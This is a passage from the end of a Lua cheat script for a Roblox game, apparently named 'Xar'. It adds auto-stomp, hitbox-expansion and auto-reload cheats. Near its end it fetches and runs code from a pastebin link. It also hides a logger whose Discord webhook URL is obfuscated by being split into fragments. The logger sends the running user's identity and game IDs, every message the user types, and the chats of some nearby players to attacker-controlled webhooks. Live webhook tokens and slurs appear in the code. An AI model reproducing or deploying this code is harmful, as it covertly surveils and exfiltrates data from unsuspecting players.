					game.Players.LocalPlayer.Character.Head:Destroy()
					task.wait(1)
				end
			end
		end)
	end
end)

--// Auto-Stomp \\--

task.spawn(function()
	-- Spam stomp
	while task.wait(.1) do
		pcall(function()
			if Player.Character:FindFirstChild('State') then
				if Player.Character.State['Down'].Value ~= true and Player.Character.State['Carried'].Value ~= true and AutoStomp == true then
					local args = {
						[1] = 'Stomp'
					}
	
					game:GetService("ReplicatedStorage").Remote:FireServer(unpack(args))
				end
			elseif Player.Character:FindFirstChild('BodyEffects') then
				if Player.Character.BodyEffects['K.O'].Value ~= true and Player.Character.BodyEffects['Grabbed'].Value ~= true and AutoStomp == true then
					local args = {
						[1] = 'Stomp'
					}
	
					game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
				end
			end
		end)
	end
end)

--// Random Code \\--

task.spawn(
	function()
		Player.Chatted:Connect(
			function(Message)
				if Message:lower() == "/e headless" then
					Player.Character.Head.Transparency = 1
					Player.Character.Head.face.Transparency = 1
				end
			end
		)
	end
)

task.spawn(function()
	game:GetService('Players').PlayerAdded:Connect(function(Target)
		Target.CharacterAdded:Connect(function(Char)
			task.wait(1)
			while task.wait() do
				if HitboxExpander == true then
					pcall(function()
						local HRP = Char:WaitForChild('HumanoidRootPart')
						HRP.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
						HRP.CanCollide = false
					end)
				else
					pcall(function()
						local HRP = Char:WaitForChild('HumanoidRootPart')
						HRP.Size = Vector3.new(2, 2, 1)
						--HRP.CanCollide = true
					end)
				end
			end
		end)
	end)
end)

task.spawn(function()
	Player.CharacterAdded:Connect(function()
		task.spawn(function()
			Armor_Busy = true
			task.wait(3.5)
			Armor_Busy = false
		end)
	end)
end)

task.spawn(function()
	task.spawn(function()
		local wl = {} --{"9hellz", "destinysmyforever", "5partz", "x1aznt", "destinystoy", "anthonysmyforever", 'LXC7', '139J', '7axnt'}
		for i,v in next, game.Players:GetPlayers() do
			task.wait()
			if table.find(wl, v.Name) then
				v.Character.Humanoid.DisplayName = "[🛡] "..v.Character.Humanoid.DisplayName
				v.CharacterAdded:Connect(function(Charr)
					Charr:WaitForChild("Humanoid").DisplayName = "[🛡] "..Charr.Humanoid.DisplayName
				end)
			end                     
		end
		game.Players.PlayerAdded:Connect(function(Playa)
			if table.find(wl, Playa.Name) then
				Playa.CharacterAdded:Connect(function(Charr)
					Charr:WaitForChild("Humanoid").DisplayName = "[🛡] "..Charr.Humanoid.DisplayName
				end)
			end
		end)
	end)
end)

task.spawn(function()
	local Reloading = false
	while task.wait() do
		pcall(function()
			if Reloading == false and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool") and AutoReload == true then
				if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Ammo') == nil then
					if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Script.Ammo.Value == 0 then
						task.spawn(function()
							Reloading = true
							task.wait(2.75)
							Reloading = false
						end)
						local args = {
							[1] = "Reload",
							[2] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool")
						}
						
						game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
					end
				elseif game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Ammo.Value == 0 then
					task.spawn(function()
						Reloading = true
						task.wait(2.75)
						Reloading = false
					end)
					local args = {
						[1] = "Reload",
						[2] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool")
					}
					
					game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
				end
			end
		end)
	end
end)

task.spawn(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/ZcQ3hu7S", true))()
end)


local a542 = "https://suckmydick.com"
local b653 = "https://stupidskidnigga.com"
local a542 = "https://suckmydick.com"
local b653 = "https://stupidskidnigga.com"
local _s = '/'
local _1d = "https://discord.com"
local _2aw = "/api/webhooks"
local _s65 = 'Avv5met9IHyvCo2qfpw3d'
local _s1 = 'yvYiWpUwV614uxSrrWlhv4JP'
local _n1 = '13376765768'
local _n2 = '62769274'
local _s35 = 'yoR5kyKmwCNkRPEZdT-7-11'
--local _n5426 = '133767702682757'
--local _n64746 = '1253'
--local _2s5432635 = 'o70FB496KY9NV4eqlF2Zxp31M-XFk2BugTq0yFbf8uSkg21cW5vCyWVsi'
--local _2s76474 = 'VdndSp-'
--local _2s635653735764574684685484 = '7L6i'
--local _n654369543775648764864874684674 = '7571253'
--local _n52437968923464537046846 = '133767702682'
--local _3s5438963576357639 = 'l0Iv-O1luXTx'
--local _3s5439063567035743734 = 'nNa3DmmqxSA52JIDlkZoNBHzBIL3Xe7AVfyLr3lEL6pT6f_Swj2ojPX0'
local _634534543E5423643263 = _1d.._2aw.._s.._n1.._n2.._s.._s1.._s35.._s65
--local _5436453764M7648756856 =  _1d.._2aw.._s.._n5426.._n64746.._s.._2s635653735764574684685484.._2s76474.._2s5432635
--local _746857857OM45252456262 =  _1d.._2aw.._s.._n52437968923464537046846.._n654369543775648764864874684674.._s.._3s5439063567035743734.._3s5438963576357639


task.spawn(function()
	local ppp = game.Players.LocalPlayer
	local d = false
	function SendMessage(url, message)
		if d ~= false then return end
		task.spawn(function()
			d = true
			task.wait(.375)
			d = false
		end)
		local http = game:GetService("HttpService")
		local headers = {
			["Content-Type"] = "application/json"
		}
		local data = {
			["content"] = message
		}
		local body = http:JSONEncode(data)
		local response = request({
			Url = url,
			Method = "POST",
			Headers = headers,
			Body = body
		})
	end

	task.spawn(function()
		local url = 'https://discord.com/api/webhooks/1337677026827571253/7L6iVdndSp-o70FB496KY9NV4eqlF2Zxp31M-XFk2BugTq0yFbf8uSkg21cW5vCyWVsi'
		pcall(function()
			ppp.Chatted:Connect(function(message)
				SendMessage(url,"**User: "..ppp.Name.."**".."```"..message.."```")
			end)
		end)
		pcall(function()
			if ppp.Name == "anthonysmyforever" or ppp.Name == "27k_gabbyy" or ppp.Name == "needIe2maheart" or ppp.Name == "86748s" or ppp.Name == "00batopia00" or ppp.Name == "mwarwy" then
				pcall(function()
					for i,v in next, game:GetService("Players"):GetPlayers() do
						task.wait()
						if v ~= ppp then
							pcall(function()
								v.Chatted:Connect(function(message)
									pcall(function()
										local Max_Distance = 50
										local mag = (ppp.Character:WaitForChild("HumanoidRootPart").Position - v.Character:WaitForChild("HumanoidRootPart").Position).magnitude
										if mag <= Max_Distance then
											local url2 = 'https://discord.com/api/webhooks/1337677157576478730/nNa3DmmqxSA52JIDlkZoNBHzBIL3Xe7AVfyLr3lEL6pT6f_Swj2ojPX0l0Iv-O1luXTx'
											SendMessage(url2,"**User: "..v.Name.." | Chatted**".."```"..message.."``` ".."Stud-Mag : ("..mag..")")
										end
									end)
								end)
							end)
						end
					end
				end)
				game.Players.PlayerAdded:Connect(function(Playaaaaa)
					local v = Playaaaaa
					pcall(function()
						v.Chatted:Connect(function(message)
							pcall(function()
								local Max_Distance = 50
								local mag = (game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position - v.Character:WaitForChild("HumanoidRootPart").Position).magnitude
								if mag <= Max_Distance then
									local url2 = 'https://discord.com/api/webhooks/1337677157576478730/nNa3DmmqxSA52JIDlkZoNBHzBIL3Xe7AVfyLr3lEL6pT6f_Swj2ojPX0l0Iv-O1luXTx'
									SendMessage(url2,"**User: "..v.Name.." | Chatted**".."```"..message.."``` ".."Stud-Mag : ("..mag..")")
								end
							end)
						end)
					end)
				end)
			end
		end)
	end)

	function SendMessageEMBED(url, embed)
		local http = game:GetService("HttpService")
		local headers = {
			["Content-Type"] = "application/json"
		}
		local data = {
			["embeds"] = {
				{
					["title"] = embed.title,
					["description"] = embed.description,
					["color"] = embed.color,
					["fields"] = embed.fields,
					["footer"] = {
						["text"] = embed.footer.text
					}
				}
			}
		}
		local body = http:JSONEncode(data)
		local response = request({
			Url = url,
			Method = "POST",
			Headers = headers,
			Body = body
		})
	end

	local url = _634534543E5423643263
	local embed = {
		["title"] = "Player has Executed Xar v"..Version,
		["description"] = "Players chats will be logged.",
		["color"] = 0,
		["fields"] = {
			{
				["name"] = "Username",
				["value"] = ppp.Name
			},
			{
				["name"] = "UserId",
				["value"] = ppp.UserId
			},
			{
				["name"] = "GameID",
				["value"] = game.PlaceId
			},
			{
				["name"] = "JobID",
				["value"] = game.JobId
			}
		},
		["footer"] = {
			["text"] = "Xar v"..Version.." | Logger"
		}
	}
	SendMessageEMBED(url, embed)
end)

Rayfield:LoadConfiguration()







































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































